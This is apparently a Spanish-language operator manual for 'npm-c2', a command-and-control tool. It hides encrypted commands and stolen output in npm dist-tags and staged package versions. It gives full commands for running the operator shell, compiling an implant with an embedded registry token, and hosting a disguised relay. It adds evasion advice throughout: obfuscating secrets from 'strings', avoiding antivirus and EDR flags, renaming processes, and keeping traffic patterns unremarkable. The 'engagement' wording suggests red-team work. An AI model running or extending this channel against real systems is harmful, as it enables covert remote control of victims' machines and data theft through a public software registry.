# npm-c2 — manual de operación

Canal de mando y control sobre los dist-tags de un paquete npm. El operador
escribe tags; el implante los lee, ejecuta y responde.

## Modelo mental

```
operador                    registro npm                 implante
   |                            |                           |
   |-- PUT x64-<gid>-... ------>|                           |
   |    (comando cifrado)       |<---- GET cada N s --------|
   |                            |      (lee el mapa)        |
   |                            |                           |-- ejecuta
   |<-- GET arm64-<gid>-... ----|<---- PUT arm64-... -------|
   |    (salida cifrada)        |                           |
   |-- DELETE (si hay permiso) >|                           |
```

Cada tag es un trozo de mensaje en base64url. Prefijos:

| Prefijo | Dirección | Contenido |
|---|---|---|
| `x64-`   | operador → implante | comando |
| `arm64-` | implante → operador | respuesta |
| `ia32-`  | implante → operador | heartbeat (host\|user\|pid\|unix) |

## Arrancar el operador

```bash
cd /home/ika/lab/npm-c2 && source .venv/bin/activate

npm-c2 operator -p <paquete> -t <token> --passphrase '<pass>' shell
```

Consola interactiva. Escribe comandos, recibe salida.

```
[*] interactive channel on runtime-metrics-relay
[*] type :help for meta-commands, :quit to detach
[*] waiting up to 120s per command, polling every 5s
c2> whoami
[+] x64-5cef-0101_IEhvVFBzZYcAPiRGS0dJSzLp1kL8SolhCjW5groUOddo8j8
[*] waiting up to 120s for output
KALI\ika
c2>
```

## Meta-comandos de la shell

| Comando | Efecto |
|---|---|
| `:clients` | quién está conectado: host, user, pid, última vez |
| `:stats` | cuántos tags pendientes / resultados / heartbeats |
| `:wait <s>` | timeout por comando (antes estaba roto) |
| `:interval <s>` | cada cuánto pollea mientras espera |
| `:poll` | vuelca todos los resultados presentes |
| `:beacons` | heartbeats en crudo |
| `:clean` | borra los tags del canal |
| `:quit` | salir; el implante sigue polleando |

## Subcomandos sueltos

```bash
npm-c2 operator -p PKG -t TOK run "whoami"      # un comando, espera salida
npm-c2 operator -p PKG -t TOK task --cmd "..."  # encola sin esperar
npm-c2 operator -p PKG -t TOK clients            # clientes conectados
npm-c2 operator -p PKG -t TOK stats              # estado del canal
npm-c2 operator -p PKG -t TOK watch --interval 5 # escucha continua
npm-c2 operator -p PKG -t TOK poll               # resultados pendientes
npm-c2 operator -p PKG -t TOK clean --all        # borra tags
npm-c2 doctor -p PKG -t TOK                      # comprueba token y permisos
```

## Flags globales

```
--passphrase '<pass>'   obligatorio si el implante cifra
--api-base <url>        registro alternativo (o NPMC2_API_BASE)
                        TAG_VALUE por entorno: NPMC2_TAG_VALUE=0.0.0-stage
```

`TAG_VALUE` es la versión a la que apuntan los tags. **Debe existir** en el
paquete o npm responde 400.

## Compilar el implante

```bash
# contra npmjs
python3 native/build_go.py -p PKG -t npm_xxx --passphrase '<pass>' \
  --interval 60 --jitter 20

# contra un registro propio
python3 native/build_go.py -p PKG -t TOK --api-base http://10.0.0.5:4874 \
  --passphrase '<pass>' --interval 30 --jitter 5

# opciones
--tag-value 0.0.0-stage   versión destino cuando el paquete no está en 1.0.0
--upx                     ~34% menos tamaño, pero UPX0/UPX1 visibles y
                          Defender lo marca; no usar con EDR delante
--32                      también compila 386
```

El binario lleva todo incrustado: se ejecuta sin argumentos en el objetivo.

## Seguridad del canal

**Sin cifrado, cualquiera lee el canal.** Los dist-tags de npmjs son públicos:
un simple GET sin token devuelve el mapa, y base64 se decodifica en un
comando. Verificado: se leían comandos como `whoami` en claro.

Con `--passphrase`, cada payload va con AES-256-GCM:

- clave derivada con HKDF-SHA256
- nonce aleatorio por payload
- AAD ligado al nombre del paquete (impide reutilizar el cifrado en otro canal)

La passphrase se incrusta ofuscada con el mismo esquema que el token, así que
`strings` sobre el binario no revela ninguna de las dos. Comprobado.

**Compresión.** Un tag lleva ~174 bytes. Comprimir antes de cifrar convierte
1,3 KB de salida de 8 tags en 1, y 9 KB en 1 tag en lugar de 71. Un mapa más
pequeño es lo que mantiene barato cada poll.

## Comportamiento del borrado

Tras leer la salida, el operador borra los tags que usó. Pero depende del
registro:

| Registro | PUT | DELETE | Resultado |
|---|---|---|---|
| Verdaccio propio | sí | sí | mapa limpio tras cada comando |
| npmjs, token bypass-2FA | depende | **403** | se intenta una vez y se desactiva |

En npm no reintenta: un 403 desactiva el borrado para el resto de la sesión.
Si sigue martilleando, gasta una petición fallida por comando, y ese patrón
es exactamente lo que llama la atención sobre un paquete.

`clean_tags.py` sirve para limpiar a mano:

```bash
./clean_tags.py -p PKG -t TOK              # dry run
./clean_tags.py -p PKG -t TOK --apply      # borra de verdad
./clean_tags.py -p PKG -t TOK --base http://127.0.0.1:4874 --apply
```

## Coste por poll

Medido contra npmjs real:

```
latencia             ~260 ms por lectura
ETag / 304           no existe en la ruta dist-tags
cache CDN            cf-cache-status: DYNAMIC
rate limit           3 req/s sin throttling
coste por tag        ~25 bytes
```

Y como npm no borra, el mapa crece. Con 62 tags un poll son 1,6 KB; con 200,
22x el coste de uno vacío. El intervalo hay que elegirlo por presupuesto:

```
intervalo   polls/día   GET/día   MB/día
      60s        1440      1440     2.32
     300s         288       288     0.46
    1800s          48        48     0.08
```

## Verdaccio propio

```bash
cd /home/ika/lab/npmreg
node_modules/.bin/verdaccio --config ./config.yaml   # :4873
python3 guard.py                                     # :4874 (bloquea /-/user/)
```

Apunta siempre el implante al **4874**, no al 4873: el guard cierra el
registro de usuarios, porque Verdaccio 7 ignora `max_users` para eso
(probado con -1 y 0).

El proceso se renombra a "npm-c2 relay" (viene de `web.title`), así que
`pkill -f verdaccio` no lo encuentra. Usa `pkill -f "npm-c2 relay"`.

## Tests

```bash
for t in test_bugs test_e2e test_standalone test_operational test_engagement \
         test_crypto_interop test_encrypted_channel test_compression test_wipe; do
  .venv/bin/python tests/$t.py || echo "FALLO $t"
done
.venv/bin/python -m npm_c2 --self-test
```

## Limitaciones conocidas

- **Token granular bypass-2FA en npm**: escribe tags solo mientras npm lo
  permita, no puede borrar (403) ni crear paquetes (`E_STAGE_REQUIRED`). Para
  publicar hace falta `npm stage publish` + `npm stage approve` con OTP
  interactivo, o un token clásico read-write.
- **El mapa no se puede acotar** en npm: el payload viaja en el *nombre* del
  tag y solo se puede sobrescribir el *valor* (que debe ser una versión
  existente). No hay anillo de slots posible.
- **HTTP en claro** contra Verdaccio: si el tráfico cruza una red no
  confiable, pon TLS delante.

## Transporte por staging (npmjs cuando dist-tags ya no escribe)

npm retiró los tokens clásicos y quitó la escritura directa a los granulares
con `bypass_2fa`. Medido contra registry.npmjs.org:

```
PUT  /-/package/<pkg>/dist-tags/<tag>     -> 403  (automation token)
POST /-/stage/package/<pkg>               -> 201  (funciona)
```

El staging es la única vía de escritura que npm sigue permitiendo a la
automatización, y es a la que ellos mismos dicen que hay que moverse para
2027. Así que el canal puede montarse sobre versiones staged.

### Cómo se transporta

El registro solo devuelve la **versión** al lector, así que el payload va ahí:

```
0.0.0-<canal>.<h><seq>.<tipo>.<payload>

canal   4 chars, primero a-f  (nunca parece numérico)
seq     "h" + 6 hex           (prefijo alfabético: los ceros a la izquierda
                               son legales y el campo tiene ancho fijo)
tipo    c comando | r respuesta
payload base32 A-Z2-7         (sin 0/1, luego nunca rompe la regla semver
                               del cero a la izquierda; 5 bits por char)
```

Restricciones de semver que obligaron a este diseño (medidas, no supuestas):

- longitud total de la versión < ~250 chars (238 vale, 259 se rechaza)
- el prerelease solo admite `[0-9A-Za-z.-]`; **el guion bajo se rechaza**
- un identificador todo numérico no puede empezar por cero

Capacidad: ~227 chars base32 ≈ **141 bytes por versión**, antes de comprimir.

### Uso

```bash
# operador
npm-c2 stage -p <pkg> -t <token> -c f00d --passphrase '<pass>' "whoami"

# consola
npm-c2 stage -p <pkg> -t <token> -c f00d --passphrase '<pass>'

# implante
python3 native/build_go.py -p <pkg> -t <token> --stage-chan f00d \
  --passphrase '<pass>' --interval 60
```

### Diferencias con el canal de dist-tags

| | dist-tags | staging |
|---|---|---|
| Escritura | 403 con token bypass-2fa | **funciona** |
| Lectura | pública, sin token | **requiere token** |
| Visible en `npm view` | sí (packument) | no |
| Borrado | 403 | 401 (pide OTP) |
| Basura | tags que crecen | versiones staged que crecen |

El intercambio es explícito: ganas escritura, pero **el implante lleva el
token** porque `GET /-/stage` da 401 sin él. En dist-tags la lectura era
anónima.

### Limpieza

No hay API de borrado: cada mensaje deja una versión staged. Se limpian a
mano desde npmjs.com → Staged Packages → Reject. Antes de un engagement,
usa un canal nuevo (`-c`) para no arrastrar el histórico.
